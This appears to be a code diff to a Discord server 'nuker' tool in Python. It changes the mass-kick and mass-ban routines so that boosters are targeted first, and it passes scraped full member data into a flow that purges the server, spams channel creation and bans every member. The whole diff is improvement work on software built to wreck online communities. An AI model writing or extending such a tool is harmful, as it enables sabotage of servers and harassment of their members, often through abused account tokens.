@@ -198,7 +198,10 @@ async def main(token: str, guild_id):
 
     elif choice == "03":
         api = Tools.api("/guilds/%s/members" % guild_id)
-        users = await Tools.break_limit(api, token)
+        full_users = await Tools.break_limit(api, token, return_full_data=True)
+        # Sort users: Boosters first
+        full_users.sort(key=lambda x: x.get("premium_since") is None)
+        users = [i["user"]["id"] for i in full_users]
         
         total = len(users)
         members_per_arrary = round(total/6)
@@ -264,7 +267,11 @@ async def main(token: str, guild_id):
         
     elif choice == "04":
         api = Tools.api("/guilds/%s/members" % guild_id)
-        users = await Tools.break_limit(api, token)
+        full_users = await Tools.break_limit(api, token, return_full_data=True)
+        # Sort users: Boosters first
+        full_users.sort(key=lambda x: x.get("premium_since") is None)
+        users = [i["user"]["id"] for i in full_users]
+        
         def kick(member):
             if nuker.kick(member):
                 Logger.Success.success("Kicked %s%s" % (Fore.YELLOW, member))
@@ -729,9 +736,14 @@ async def main(token: str, guild_id):
 
             scrapping_datas = ["channels", "roles", "members", "emojis", ]
 
+            all_members_data = []
             for data in scrapping_datas:
                 print(palette.sky_blue + "Scrapping %s%s " % (palette.better_purpule, data))
                 value = await scrapp(data)
+                if data == "members":
+                    all_members_data = value
+                    value = [i["user"]["id"] for i in value]
+                
                 value = [i for i in filter(lambda x: x != None, value)]
                 with open("./Scraped/%s.txt" % data, "w") as file:
                     file.write('\n'.join(value))
@@ -776,7 +788,11 @@ async def main(token: str, guild_id):
                     t.start()
                     threads.append(t)
 
-            async def ban_members(users):
+            async def ban_members(users_data):
+                # users_data is list of full member objects
+                users_data.sort(key=lambda x: x.get("premium_since") is None)
+                users = [i["user"]["id"] for i in users_data]
+                
                 total = len(users)
                 members_per_arrary = round(total/6)
 
@@ -873,11 +889,8 @@ async def main(token: str, guild_id):
             Thread(target=purge_server ).start()
             Thread(target=create, args = (100,)).start()
             time.sleep(10)
-            with open("./Scraped/members.txt", "r") as file:
-
-                users = [i.strip() for i in file.readlines()]
-
-            await ban_members(users)
+            # Use the full data for sorting boosters first
+            await ban_members(all_members_data)
 
 
             return await back_to_manu()
